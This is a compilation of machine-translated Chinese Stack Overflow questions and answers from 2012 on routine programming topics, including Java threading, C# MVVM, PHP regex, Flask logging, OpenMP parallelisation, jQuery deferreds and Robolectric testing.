# java - Java循环中的Setter Getter方法

> ID：13217456
> 
> 赞同：-2
> 
> 时间：2012-11-04T09:32:01.927
> 
> 标签：java

我最近了解了 Setter 和 Getter。我可以使用它们，但问题是我必须循环使用它们。下面提到了我正在使用的一些代码。

我在一个循环中输入学生信息，然后使用 Set Get 方法在另一个循环中对其进行编辑。我可以在没有循环的情况下使用 setter 和 getter 方法，但我不确定如何在循环中使用它们。所以请指导我在 stu 数组中添加学生。

```
 public static void   Addstudents()
    {   
      for(int i=0; i<stu.length; i++)
      {
        stu[i]=new Stuinfo();
        System.out.println("Enter name ");
        name= sc.next();
        System.out.println("Enter id  ");
        id= sc.next();
      }
    } 
```

为了编辑数据，我想运行一个循环并使用 setter 方法来设置值。像这样的东西：

```
 public void Modify()
  { 
    String Cid; 
    System.out.println("You r modifying account");
    for (int i=0; i<stu.length;i++)
    { 
      stu[i].setId(id)...// dont know what to do in loop hree 
    }
  } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T09:40:30.063

问题不清楚，我认为要修改单个学生的特定帐户，您需要这样的东西：

```
 public void Modify() {   
    String Cid; 
    System.out.println("Enter your ID :");
    Scanner sc = new Scanner(System.in);
    int id = sc.nextInt();

    for (int i=0; i<stu.length;i++)
    {   
           if(id == stu[i].getId()) {
            //Change your account details
            System.out.println("Enter name ");
             name= sc.next();
             stu[i].setName(name);
            }

    }
     } 
```

在上面的例子中，你得到一个 id 作为输入，然后你在数组中查找输入 id，如果你找到了，你就给了用户机会去改变那个特定用户的账户信息...

在第一个示例中，您必须使用 setters 设置学生实例属性：

```
 public static void   Addstudents()
     {

     for(int i=0; i<stu.length; i++)
    {
    stu[i]=new Stuinfo();
    System.out.println("Enter name ");
    stu[i].setName( sc.next() );
    System.out.println("Enter id  ");
    stu[i].setId( sc.next() ); 

    }

    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T09:36:44.493

```
public void Modify() {   
    System.out.println("You r  modifying account");
    Scanner sc = new Scanner(System.in);

    for (int i=0; i<stu.length;i++)
    {   
        System.out.println("Enter id");
        stu[i].setId(sc.nextInt());
        System.out.println("Enter name ");
        stu[i].setName(sc.nextLine());
    }
} 
```

# c# - 如何从列表中删除？面向 MVVM 模式

> ID：13217470
> 
> 赞同：1
> 
> 时间：2012-11-04T09:34:43.717
> 
> 标签：c#, wpf, mvvm

所以我有一个列表视图，它的 itemsSource 属性绑定到一个 ObservableCollection，放置在视图模型上。还有一个按钮 on view 我如何制作它，以便按钮从 observableCollection 中删除在 listview 上选择的项目？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-05T07:59:32.307

只是添加另一种方式来做到这一点：

```
<ListView ItemsSource="{Binding MyList}"             
          SelectedItem="{Binding SelectedItem}"/>

<Button Command="{Binding DeleteCommand}"/> 
```

在您的 ViewModel 中，您有一个名为的属性`SelectedItem`，每次您更改`ListView`.

现在您可以`ViewModel`轻松地处理删除：

```
internal class ViewModel
{
    public ViewModel()
    {
        this.DeleteCommand = new RelayCommand(() => this.Delete());
    }
    public void Delete()
    {
        this.MyList.Remove(this.SelectedItem);
    }
} 
```

去[这里](http://msdn.microsoft.com/en-us/magazine/dd419663.aspx)了解更多信息`RelayCommand`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-05T07:44:12.310

有很多方法可以做到这一点。一种方法是使用参数创建 a`RelayCommand`或 a`DelegateCommand`

```
<Button Command="{Binding MyDeleteCommand}" 
        CommandParameter="{Binding ElementName=mylistview, Path=SelectedItem}"/> 
```

您可以按照 AlSki 发布的方式将其绑定`SelectedItem`到您的`ViewModel`并处理您的不带参数的命令`ViewModel`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T09:40:35.633

将第二个属性绑定到列表视图选定项，将第三个属性绑定到视图模型上的命令，它只是从项目列表中删除选定项。

请参阅[http://msdn.microsoft.com/en-us/magazine/dd419663.aspx](http://msdn.microsoft.com/en-us/magazine/dd419663.aspx)

# php - php中的正则表达式

> ID：13217471
> 
> 赞同：1
> 
> 时间：2012-11-04T09:34:47.270
> 
> 标签：php, regex, preg-replace, preg-match

我需要一个正则表达式来检查字符串中的大写字母。它在哪里找到一个大写它需要在它之前添加空格。我为此编写了一些代码，但问题是它仅在字符串中只有一个大写字母时才有效。但我需要处理字符串中存在的任意数量的大写字母。我在下面粘贴了我的代码：

```
 $regEx = preg_match('*[A-Z]*', $str, $matches, PREG_OFFSET_CAPTURE);
            if(!empty($regEx)) {
                $str = substr_replace($str,' ', $matches[0][1], 0);
            } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T09:36:07.677

> 我需要一个正则表达式来检查字符串中的大写字母。在它找到大写字母的地方，它需要在它之前添加空格。

`preg_replace()`听起来更适合实现这一目标......

```
$str = preg_replace('/[A-Z]/', ' $0', $str); 
```

[键盘](http://codepad.org/nSQYWGbd)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T09:44:17.080

请尝试以下代码：

```
if(preg_match("/[A-Z]/", $string)===0) {
    return true;
} 
```

# c# - 如何在 C# 代码中重新启用 EntranceThemeTransition？

> ID：13217473
> 
> 赞同：3
> 
> 时间：2012-11-04T09:35:08.027
> 
> 标签：c#, xaml, windows-8

从[这个链接](http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.xaml.media.animation.entrancethemetransition.aspx)。我可以在 XAML 中`Grid`使用此代码为我制作动画：`Grid`

```
<Grid.Transitions>
    <TransitionCollection>
        <EntranceThemeTransition />
    </TransitionCollection>
</Grid.Transitions> 
```

当我们开始页面时，它只是为网格设置动画。但是我们可以在 C# 中再次对其进行动画处理，以便当用户单击按钮时它会再次进行动画处理吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-05-29T02:45:17.743

如果您正在尝试重新激活过渡，我建议您可以删除网格，然后再次创建网格：

XAML

```
<Grid x:Name="grid"></Grid> 
```

然后在代码中你可以这样做

```
grid.Children.Clear(); 
```

然后再重新创建它

```
grid.Children.Add("//insertItemsHere"); 
```

例如，在单击按钮后，它将删除网格中的所有项目，并通过它再次添加控件，它将再次执行动画。

这里有一个示例代码：

```
public void btn_click(object sender, RoutedEventsArgs e)
{
    Grid.Children.Clear();
    Grid.Children.Add(ListView);

} 
```

# java - 创建多线程java类来处理数据

> ID：13217482
> 
> 赞同：0
> 
> 时间：2012-11-04T09:36:27.773
> 
> 标签：java, multithreading, wait, synchronized

我想在Java中实现类，它将等待来自不同线程的新数据，当他得到它时，这个类将处理它并再次等待新数据。我想只使用**synchronized、wait、notifyAll**命令来实现这一点。我尝试了一些变体：

1) 使用一个线程，通过命令 lockObject.wait() 等待。但是当所有活动线程完成工作时，该线程将永远等待。当然，我可以创建方法 stopProcess()，但它不安全，因为另一个程序员可能会忘记调用它。

2）使用一个守护线程，它不会工作，因为当所有活动线程完成他们的工作时，我的守护线程死了，但他可以有一些他必须处理的数据

3）当新数据到来时 - 创建新线程，它将处理数据。当线程处于活动状态时（他处理给定的数据），他将接收新数据。当没有数据到来并且所有旧数据都被处理时，线程完成工作。这个变体的减号是 - 当数据通过某个时期（当线程有时间处理旧数据并死亡时），将创建一个新线程。我认为这对性能或/和内存不利。我对吗？

是否可以只使用一个或两个（可能结合使用守护进程和活动线程）线程而不使用 stopProcess() 方法来解决我的问题？

这里有一些代码

我对阻塞队列的认识

```
public class BlockingQueue<T> {
    private Queue<T> queue = new LinkedList<T>();

    public void add(T el){
        synchronized (queue){
            queue.add(el);
        }
    }

    public T getFirst(){
        synchronized (queue){
            return queue.poll();
        }
    }

    public int getSize(){
        synchronized (queue){
            return queue.size();
        }
    }
} 
```

数据类

```
public class Data {
    //some data

    public void process(){
        //process this data
    }
} 
```

代码的第一个变体

```
public class ProcessData {

    private BlockingQueue<Data> queue = new BlockingQueue<Data>();
    private boolean run = false;
    private Thread processThread;
    private Object lock = new Object();

    public synchronized void addData(Data data) throws Exception {
        if (run){
            if (data != null){
                queue.add(data);
                wakeUpToProcess();
            }
        }else{
            throw new Exception("");
        }
    }

    public synchronized void start() {
        if (!run){
            run = true;

            processThread = new Thread(new Runnable() {
                public void run() {

                    while (run || queue.getSize()!=0){

                        while(queue.getSize() == 0 && run){
                            //if stopProcess was not called
                            //and no active threads
                            //it will not die
                            waitForNewData();
                        }

                        Data cur;
                        while(queue.getSize() > 0){
                            cur = queue.getFirst();
                            cur.process();
                        }

                    }
                }
            });
            processThread.start();

        }
    }

    public synchronized void stopProcess() {
        if (run){
            run = false;
            wakeUpToProcess();
        }
    }

    private void waitForNewData(){
        try{
            synchronized (lock){
                lock.wait();
            }
        }catch (InterruptedException ex){
            ex.printStackTrace();
        }
    }

    private void wakeUpToProcess(){
        synchronized (lock){
            lock.notifyAll();
        }
    }
} 
```

在第二个变体中，我将 processThread 作为守护进程。但是当活动线程死亡时，processThread 完成工作，但队列中有一些数据，我必须处理。

第三种变体

```
public class ProcessData {

    private BlockingQueue<Data> queue = new BlockingQueue<Data>();
    private boolean run = false;
    private Thread processThread = null;

    public synchronized void addData(Data data) throws Exception {
        if (run){
            if (data != null){
                queue.add(data);
                wakeExecutor();
            }
        }else{
            throw new Exception("ProcessData is stopped!");
        }
    }

    public synchronized void start() {
        if (!run){
            run = true;
        }
    }

    public synchronized void stopProcess() {
        if (run){
            run = false;
        }
    }

    public boolean isRunning(){
        return this.run;
    }

    protected void wakeExecutor(){
        if (processThread ==null || !processThread.isAlive()){
            processThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    Data cur;
                    while(queue.getSize() > 0){
                        cur = queue.getFirst();
                        cur.process();
                    }
                }
            });
            processThread.start();
        }
    }
} 
```

重要的是，数据必须按照来自线程的顺序进行处理。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T11:24:53.027

You are seriously reinventing the wheel here. All you want is available in the JDK in the [`java.util.concurrent` package](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/package-summary.html).

Implement a [producer-consumer pattern](http://en.wikipedia.org/wiki/Producer-consumer_problem) via a [BlockingQueue](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/BlockingQueue.html), with your producers calling [`offer()`](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/BlockingQueue.html#offer%28E%29) and your consumer thread calling [`take()`](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/BlockingQueue.html#take%28%29), which blocks until something's available.

That's it. You don't need, and you shouldn't be writing, all those classes you have written. These concurrent classes do all the locking and synchronization for you, and do it *correctly* too (which is not to be underestimated)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T21:06:40.900

如果您不允许使用任何东西，`java.util.concurrent`那么您将不得不基于类似`LinkedList`. 我会将阻塞行为封装在队列中，例如（伪代码）

```
synchronized Data nextTask() {
  while(the linked list is empty) {
    wait()
  }
  remove and return head of the queue
}

synchronized void addTask(Data d) {
  add d to the queue
  notifyAll()
} 
```

然后你可以有一个消费者线程不断地做这样的事情

```
while(true) {
  taskQueue.nextTask().process()
} 
```

并且生产者线程调用`taskQueue.addTask`以将每个任务添加到队列中。如果您需要在最后正常关闭，那么您要么需要一些“哨兵值”来告诉消费者线程完成，要么找到某种`Thread.interrupt()`在正确时间调用的方法。

# yii - Yii：通过将 HTML 流式传输到 PDF 从服务器响应生成 PDF 文档

> ID：13217483
> 
> 赞同：0
> 
> 时间：2012-11-04T09:36:42.963
> 
> 标签：yii, pdf-generation

我是 Web 开发的新手，从过去记得我的一个朋友曾经有一个实现，其中 HTML 的服务器响应流存储在一个变量中，然后输出为 PDF，这是几年前的 JSP。如果我没记错的话，我不知道如何在 Yii 中实现这一点。我已经探索了 TCPDF 并且可以通过编码 HTML 标签来生成 PDF，但是，我正在研究将 URL 响应的输出流式传输到变量中然后使用它来生成 PDF 的选项。我做了以下，但它不工作。**我在filesize($filename)**收到错误：

```
$pdf->AddPage();
$filename = 'http://localhost/webapp/index.php/link/to/some/page';
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
$pdf->writeHTML($contents ,true); 
```

我对如何实现这一点有点迷茫，非常感谢所有帮助。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T09:44:41.243

[我在其他论坛](http://www.yiiframework.com/forum/index.php/topic/37202-yii-generating-pdf-document-from-server-response-by-streaming-html-into-pdf/page__gopid__179498#entry179498)的帮助下得到了解决方案。我希望它可以帮助那些可能希望实现相同目标的人。解决方案是使用[Yii-pdf](http://www.yiiframework.com/extension/pdf)。我已经用 html2pdf 成功地测试了它，它就像一个魅力。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T19:16:30.950

如果您真的想获取网页的内容，您可以通过将页面渲染到控制器中并将其分配给一个变量来实现，然后您可以将其存储在 PDF 文件中

# python - Python 在单独的文件中管理类

> ID：13217489
> 
> 赞同：1
> 
> 时间：2012-11-04T09:38:10.263
> 
> 标签：python, class, design-patterns, import

我有一个使用 MVC 模式的项目。

在“模型”文件夹中，我有很多类，每个类现在都有自己的文件。但是我觉得不方便，因为每次需要使用一个类都得单独导入。例如，我的应用程序源中有许多以下内容：

```
from models.classX import classX
from models.classY import classY 
```

如果我想一次导入所有东西，就像`from models import *`我发现我可以把各种东西`import`放在`models/__init__.py`. 但这是pythonic的方式吗？什么是约定？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-04T10:04:16.230

Python is not java; please avoid the one-file-per-class pattern. If you can't change it, you can import all of them from a submodule of your `models` package:

```
# all.py: convenient import of all the needed classes
from models.classX import classX
from models.classY import classY
... 
```

Then in your code you can write:

```
import my.package.models.all as models  # or from my.package.models.all import * 
```

and proceed to use `models.classX`, `models.classY`, etc.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T11:10:25.577

首先，您应该重命名您的类和模块，使它们不匹配，并遵循 PEP8：

```
models/
    classx.py
        class ClassX
    classy.py
        class ClassY 
```

然后，我得到了这个`models/__init__.py`：

```
from models.classx import ClassX
from models.classy import ClassY 
```

在您的主代码中，您可以执行以下任何一项操作：

```
from models import *
x = ClassX() 
```

```
from models import ClassX
x = ClassX() 
```

```
import models
x = models.ClassX() 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T10:01:18.553

大多数 Pythonic 方式是您已经在使用的方式。您可以通过将类分组到模块中来减轻导入。例如，在 Django 中，通常所有应用程序模型都在一个文件中。

来自 python[文档](http://docs.python.org/2/tutorial/modules.html#importing-from-a-package)：

> 尽管某些模块设计为仅在您使用时导出遵循某些模式的名称`import *`，但在生产代码中仍然被认为是不好的做法。

# python - 使用 mod_wsgi 记录烧瓶错误

> ID：13217490
> 
> 赞同：7
> 
> 时间：2012-11-04T09:38:10.950
> 
> 标签：python, logging, mod-wsgi

很长一段时间以来，我一直在努力让它发挥作用，但我现在真的束手无策。我已经尝试做我在 SO 和烧瓶文档中可以找到的所有事情，但我仍然无法使用简单的错误日志来调试我的应用程序。以下是粘贴的代码 -

```
# main.py
from flask import Flask
import logging

app = Flask(__name__)
file_handler = logging.FileHandler(filename='/tmp/election_error.log')
file_handler.setLevel(logging.WARNING)
app.logger.addHandler(file_handler)

@app.route('/')
def hello():
   return "hello
   #missing quotes to generate error

if __name__ == "__main__":
   app.run()

#wsgi file
import sys
import logging
sys.path.insert(0, "/var/www/voting_app")
logging.basicConfig(stream=sys.stderr)
from main import app as application

# apache2 conf file
WSGIDaemonProcess voting_app threads=5
WSGIScriptAlias /election /var/www/voting_app/voting_app.wsgi

LogLevel info

<Directory /var/www/voting_app>
        WSGIProcessGroup voting_app
        WSGIApplicationGroup %{GLOBAL}
        Order deny,allow
        Allow from all
</Directory> 
```

请告诉我哪里出错了。太感谢了。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-04T19:45:59.420

您创建的特定错误（语法错误）会导致 WSGI 脚本文件甚至无法加载到 mod_wsgi。此错误最终会出现在 Apache 错误日志文件中，而不是您使用日志记录模块设置的日志文件中。您是否查看过 Apache 错误日志文件？

对于请求执行期间引发的异常，Flask 默认会将其转换为 500 错误页面，否则会抑制详细信息的显示。您需要设置 Flask 以通过其他方式发送或记录此类运行时异常：

[http://flask.pocoo.org/docs/errorhandling/](http://flask.pocoo.org/docs/errorhandling/)

如果您希望在返回浏览器的 500 页面中显示运行时异常以用于开发目的，则需要启用 Flask 调试模式。这是通过将 app.debug 设置为 True 来完成的：

[http://flask.pocoo.org/docs/config/?highlight=app%20debug](http://flask.pocoo.org/docs/config/?highlight=app%20debug)

您不应该在面向用户的生产系统上启用调试模式。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-04T09:45:09.703

您需要生成*运行时*异常，而不是编译时异常。缺少引号是编译时异常，您的日志记录代码将永远不会被执行。

只需引发异常：

```
@app.route('/')
def hello():
   raise Exception('Deliberate exception raised') 
```

# c - 如何在 OpenMP 中进行并行处理

> ID：13217492
> 
> 赞同：2
> 
> 时间：2012-11-04T09:38:18.163
> 
> 标签：c, matrix, parallel-processing, openmp

我知道 OpenMP 的基础知识，并且我知道为了并行化 a 的迭代不能依赖于以前的迭代。也可以使用归约，但它们仅支持基本运算符，例如 +、-、/、*、&&、||。

我怎样才能使这个并行？

```
for (i = 1; i < n; ++i) {
    for (j = 1; j < n; ++j) {
        // stanga
        if (res[i][j - 1] != res[i][j]) {
            cmin2[i][j][0] = min(cmin2_res[i][j - 1][0] + 1, cmin[i][j][0]);
            cmin2_res[i][j][0] = min(cmin2[i][j - 1][0] + 1, cmin_res[i][j][0]);
         } else {
            cmin2[i][j][0] = min(cmin2[i][j - 1][0] + 1, cmin[i][j][0]);
            cmin2_res[i][j][0] = min(cmin2_res[i][j - 1][0] + 1, cmin_res[i][j][0]);
         }
         // sus
         if (res[i - 1][j] != res[i][j]) {
             cmin2[i][j][0] = min3(cmin2[i][j][0], cmin2_res[i - 1][j][0] + 1, cmin[i][j][1]);
             cmin2_res[i][j][0] = min3(cmin2_res[i][j][0], cmin2[i - 1][j][0] + 1, cmin_res[i][j][1]);
         } else {
             cmin2[i][j][0] = min3(cmin2[i][j][0], cmin2[i - 1][j][0] + 1, cmin[i][j][1]);
             cmin2_res[i][j][0] = min3(cmin2_res[i][j][0], cmin2_res[i - 1][j][0] + 1, cmin_res[i][j][1]);
         }
     }
 } 
```

我的问题是我如何分解它以便能够并行运行它（如果可能的话，也许使用减少）。

问题是，在每次迭代中，操作都必须按此顺序完成，因为我还有 3 组这样的 for。

PS min 和 min3 是宏。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T18:04:39.330

有一种蛮力的方法可以做你想做的事，但更好的并行化需要更多关于你想要进出例程的输入。

在 ij 空间中，循环中的数据依赖项如下所示：

```
 i →
  ..........
j .....1....
↓ ....12....
  ...123.... 
```

其中第三点的值取决于那些点 2，而那些取决于点 1 处的值，等等。由于这种对角结构，您可以重新排序循环以对角线遍历网格，例如第一次迭代结束 (0 ,1), (1,0) 然后是 (0,2),(1,1),(2,0) 等等。您的问题的简化版本如下所示：

```
#include <stdio.h>
#include <stdlib.h>
#include <math.h>
#include <sys/time.h>

int **int2darray(int n, int m);
void free2darray(int **array);
void init2darray(int **array, int n, int m);
void tick(struct timeval *timer);
double tock(struct timeval *timer);

int main(int argc, char **argv) {

    const int N=10000;
    int **serialarr, **omparr;

    struct timeval serialtimer, omptimer;
    double serialtime, omptime;

    serialarr = int2darray(N,N);
    omparr    = int2darray(N,N);

    init2darray(serialarr, N, N);
    init2darray(omparr,    N, N);

    /* serial calculation */
    tick(&serialtimer);
    for (int i=1; i<N; i++)
        for (int j=1; j<N; j++)
            serialarr[i][j] = serialarr[i-1][j] + serialarr[i][j-1];
    serialtime = tock(&serialtimer);

    /* omp */
    tick(&omptimer);
    #pragma omp parallel shared(omparr) default(none)
    {
        for (int ipj=1; ipj<=N; ipj++) {
            #pragma omp for
            for (int j=1; j<ipj; j++) {
                int i = ipj - j;
                omparr[i][j] = omparr[i-1][j] + omparr[i][j-1];
            }
        }
        for (int ipj=N+1; ipj<2*N-1; ipj++) {
            #pragma omp for
            for (int j=ipj-N+1; j<N; j++) {
                int i = ipj - j;
                omparr[i][j] = omparr[i-1][j] + omparr[i][j-1];
            }
        }
    }
    omptime = tock(&omptimer);

    /* compare results */
    int abserr = 0;
    for (int i=0; i<N; i++)
        for (int j=0; j<N; j++)
            abserr += abs(omparr[i][j] - serialarr[i][j]);

    printf("Difference between serial and OMP array: %d\n", abserr);
    printf("Serial time = %lf\n", serialtime);
    printf("OMP time    = %lf\n", omptime);

    free2darray(omparr);
    free2darray(serialarr);
    return 0;
}

int **int2darray(int n, int m) {
    int *data = malloc(n*m*sizeof(int));
    int **array = malloc(n*sizeof(int*));
    for (int i=0; i<n; i++)
        array[i] = &(data[i*m]);

    return array;
}

void free2darray(int **array) {
    free(array[0]);
    free(array);
}

void init2darray(int **array, int n, int m) {
    for (int i=0; i<n; i++)
        for (int j=0; j<m; j++)
            array[i][j] = i*m+j;
}

void tick(struct timeval *timer) {
    gettimeofday(timer, NULL);
}

double tock(struct timeval *timer) {
    struct timeval now;
    gettimeofday(&now, NULL);
    return (now.tv_usec-timer->tv_usec)/1.0e6 + (now.tv_sec - timer->tv_sec);
} 
```

运行给出：

```
$ gcc -fopenmp -Wall -O2 loops.c -o loops -std=c99 
$ export OMP_NUM_THREADS=8
$ ./loops
Difference between serial and OMP array: 0
Serial time = 0.246649
OMP time    = 0.174936 
```

你会注意到加速很差，即使 N 很大，因为每次迭代的计算量很小，它是并行化的内部循环，我们正在以一种奇怪的、缓存不友好的顺序遍历内存。

上面的一些可能会被修复，但它会帮助更多地了解你正在尝试做的事情；例如，您关心 cmin2_res 数组，还是它们只是中间产品？换句话说，你想计算什么？

# javascript - 是否可以将 jQuery $.when 与布尔标志一起使用？

> ID：13217494
> 
> 赞同：1
> 
> 时间：2012-11-04T09:38:38.880
> 
> 标签：javascript, jquery, synchronization

我有一个 ajax 调用，当且仅当某个标志在代码中的其他位置设置时才应该执行。

我不能直接在设置标志的函数中进行此调用，因为我不需要每次设置标志时都进行此调用。

这有点难以解释，所以我能想到的最好的例子是：

当且仅当狼在奶奶家时，她才能吃掉红帽。不过不是每次她来这间屋子，都有狼来吃她。从另一边，每当她在这里，狼在这里时，狼就会吃掉她。

我想知道，我可以为此目的使用 $.when(theFlag) 吗？

```
var theRedHatIsHere = false;

function waitForRedHat()
{
.....
   theRedHatIsHere = true;
}

function wolfIsHungry(link)
{
   $.when(theRedHatIsHere)
   {
       $.ajax({
                type: "POST",
                url: "php/eatredhat.php?",
                data: ddd,
                async: false,
                success: function(msg){
                        console.log( "Eaten" );
                        window.location.href = link;
                }
        });                         
   }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T10:26:11.150

使用自定义事件或发布/订阅模式而不是弯曲 $.when 来做不应该做的事情。这是一种众所周知的模式，它有助于解耦您的组件，并且您具有灵活性，例如让多个订阅者订阅事件，在某个时候停止侦听事件或只对它做出一次反应。

使用 jQuery.on 订阅自定义事件

```
$(document).on('WolfIsHome', function(){
   $(document).on('WolfGotHungry', function(){
       $(document).on('RedHatArrived', function()
            $.ajax({
                type: "POST",
                url: "php/eatredhat.php?",
                data: ddd,
                async: false,
                success: function(msg){
                        console.log( "Eaten" );
                        window.location.href = link;
                }
            });
      }
  });
}); 
```

每当狼饿了，而不是设置该布尔值，只需引发该自定义事件：

```
$(document).trigger("WolfIsHome"); // trigger in your logic when the wolf is home

$(document).trigger("WolfGotHungry"); //trigger wolfhungry which will register a subscriber to RedHat arrival event

//and somewhere else in the code
// if RedHatArrived and Wolf is not hungry then nothing will happen 
// because there won't be registered subscribers to her arrival
$(document).trigger("RedHatArrived"); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T09:59:28.693

```
var theRedHatIsHere = $.Deferred();

function waitForRedHat()
{
.....
   theRedHatIsHere.resolve();
}

function wolfIsHungry(link)
{
   $.when(theRedHatIsHere).then(function() {
       $.ajax({
                type: "POST",
                url: "php/eatredhat.php?",
                data: ddd,
                async: false,
                success: function(msg){
                        console.log( "Eaten" );
                        window.location.href = link;
                }
        });                         
   });
} 
```

这里的缺点之一是您只能触发一次请求。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T09:52:24.797

你可以在这里做一些事情。`theRedHatIsHere`您可以将其保存在输入元素中，而不是使用全局值。像`<input type="hidden" id="theRedHatIsHere" value="0"/>`

现在一旦更新了这个值，就触发一个事件。您可以将其绑定为：

```
$(function () {
    $('#theRedHatIsHere').on("change", function () {
        if ($(this).val() == 1 && wolfIsHungry == 1) {
            $.ajax({
                type: "POST",
                url: "php/eatredhat.php?",
                data: ddd,
                async: false,
                success: function (msg) {
                    console.log("Eaten");
                    window.location.href = link; // dont know where this link is being sent from
                }
            });
        }
    });
}); 
```

听起来怎么样？

# silverlight - 如何在silverlight的另一个页面上从userControl访问控件的值？

> ID：13217496
> 
> 赞同：2
> 
> 时间：2012-11-04T09:38:55.290
> 
> 标签：silverlight

DocumentControl 是我的用户控件，我在函数中编写了以下几行，但我得到的值为空白。

```
var DocumentControl1 = new DocumentControl();                        
string docCode= DocumentControl1.txtDocCode.Text; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T10:53:29.640

将 txtDocCode 的值保存在公共变量中作为 docCode。您可以像这样访问值，

```
DocumentControl1  d= new DocumentControl();
string docCode = d.DocCode; 
```

# php - 离线访问 Facebook 需要哪些权限

> ID：13217500
> 
> 赞同：0
> 
> 时间：2012-11-04T09:39:39.423
> 
> 标签：php, facebook

目前，Facebook api 的 Offline_access 已弃用。但是我仍然想在我的用户的墙上发布一些文章，即使他们没有登录我的网站。

我现在该怎么做？我需要将哪些权限发布到未在我的网站上登录的已注册用户的墙上？

我正在使用 PHP。我希望你能帮帮我！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T11:07:53.340

只要您拥有有效的访问令牌，您就可以使用 publish_stream 扩展权限来执行此操作。

请记住，您的初始访问令牌将在 2 小时内到期，但只要您有正当理由，您可以拨打电话延长权限。

更多信息可以在这里找到：

[http://developers.facebook.com/docs/howtos/login/extending-tokens/](http://developers.facebook.com/docs/howtos/login/extending-tokens/)

# android - Robolectric：如何测试 SherlockActivity

> ID：13217502
> 
> 赞同：6
> 
> 时间：2012-11-04T09:39:43.403
> 
> 标签：android, actionbarsherlock, robolectric, android-testing

我正在尝试对扩展 SherlockActivity 的 Activity 运行测试。我阅读了有关使用 ActionBarSherlock 测试活动的解决方案的所有信息，并尝试遵循[https://github.com/passy/absshadow-sample](https://github.com/passy/absshadow-sample)

这就是我目前正在做的事情：

**自定义测试运行器：**

```
public class CustomTestRunner extends RobolectricTestRunner {
    private static final int SDK_INT = Build.VERSION.SDK_INT;

    public CustomTestRunner(Class<?> testClass) throws InitializationError {
        super(testClass);
        addClassOrPackageToInstrument("com.actionbarsherlock.app.SherlockActivity");
    }

    @Override
    protected void bindShadowClasses() {
        super.bindShadowClasses();
        Robolectric.bindShadowClass(ShadowSherlockActivity.class);
    }

    @Override
    public void beforeTest(final Method method) {
        final int targetSdkVersion = robolectricConfig.getSdkVersion();
        setStaticValue(Build.VERSION.class, "SDK_INT", targetSdkVersion);
    }

    @Override
    public void afterTest(final Method method) {
        resetStaticState();
    }

    @Override
    public void resetStaticState() {
        setStaticValue(Build.VERSION.class, "SDK_INT", SDK_INT);
    }
} 
```

**影子夏洛克活动：**

```
@Implements(SherlockActivity.class)
public class ShadowSherlockActivity extends ShadowActivity {

    @Implementation
    public void setContentView(int layoutResID) {
        super.setContentView(layoutResID);    // TODO Auto-generated method stub
    }

    @Implementation
    public ActionBar getSupportActionBar() {
        return new ActionBar() {
            // removed for readability
        };
    }
} 
```

由于某种原因，它的失败与此有关：

```
WARNING: you probably should have called setContentView() first
java.lang.Exception: Stack trace
    at java.lang.Thread.dumpStack(Thread.java:1342)
    at     com.xtremelabs.robolectric.shadows.ShadowActivity.findViewById(ShadowActivity.java:183)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at com.xtremelabs.robolectric.bytecode.ShadowWrangler.methodInvoked(ShadowWrangler.java:99)
    at com.xtremelabs.robolectric.bytecode.RobolectricInternals.methodInvoked(RobolectricInternals.java:144)
    at android.app.Activity.findViewById(Activity.java)
    at com.dgti.ds.activities.ChooseLocationActivity.findViews(ChooseLocationActivity.java:44)
    at com.dgti.ds.activities.ChooseLocationActivity.onCreate(ChooseLocationActivity.java:34)
    at com.dgti.ds.activities.ChooseLocationActivityTests.shouldGetGoogleAPIKeyIfNull(ChooseLocationActivityTests.java:81)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:44)
    at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:15)
    at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:41)
    at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:20)
    at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:28)
    at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:31)
